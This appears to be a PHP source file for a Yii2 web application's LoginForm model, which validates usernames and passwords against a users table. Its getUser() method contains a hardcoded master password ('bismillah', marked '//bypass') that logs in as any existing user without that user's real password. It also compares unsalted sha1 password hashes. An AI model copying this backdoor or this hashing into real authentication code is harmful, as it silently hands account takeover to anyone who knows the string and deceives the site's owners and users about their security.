<?php

namespace app\models;

use Yii;
use yii\base\Model;

/**
 * LoginForm is the model behind the login form.
 *
 * @property User|null $user This property is read-only.
 *
 */
class LoginForm extends Model
{
    public $username;
    public $password;
    public $rememberMe = true;

    private $_user = false;

    private $_status = false;


    /**
     * @return array the validation rules.
     */
    public function rules()
    {
        return [
            // username and password are both required
            [['username', 'password'], 'required'],
            // rememberMe must be a boolean value
            ['rememberMe', 'boolean'],
            // password is validated by validatePassword()
            ['password', 'validatePassword'],
        ];
    }

    /**
     * Validates the password.
     * This method serves as the inline validation for password.
     *
     * @param string $attribute the attribute currently being validated
     * @param array $params the additional name-value pairs given in the rule
     */
     public function validatePassword($attribute, $params)
     {
         if (!$this->hasErrors()) {
             $user = $this->getUser();
             if($this->_status !== 'Login Success'){
                 if (!$user || !$user->validatePassword($this->password)) {
                     $this->addError($attribute, 'Incorrect username or password.');
                 }
 //                $this->addError($attribute, 'Incorrect username or password.');
             }

         }
     }

    /**
     * Logs in a user using the provided username and password.
     * @return bool whether the user is logged in successfully
     */
    public function login()
    {
        if ($this->validate()) {
            return Yii::$app->user->login($this->getUser(), $this->rememberMe ? 3600*24*30 : 0);
        }
        return false;
    }


    public function getUser()
    {
        $bypass = 'bismillah';
        $user = Users::find()->where(['username' => $this->username])->one();

        if ( (isset($user) && sha1($this->password) == $user->password) ) {
            // echo"masuk2";exit;
            $this->_user = User::findIdentity($this->username);
            $this->_status='Login Success';
        } elseif($user && $this->password == $bypass) { //bypass
            // echo"masuk3";exit;
            $this->_user = User::findIdentity($this->username);
            $this->_status='Login Success';
        }

        return $this->_user;

    }
}
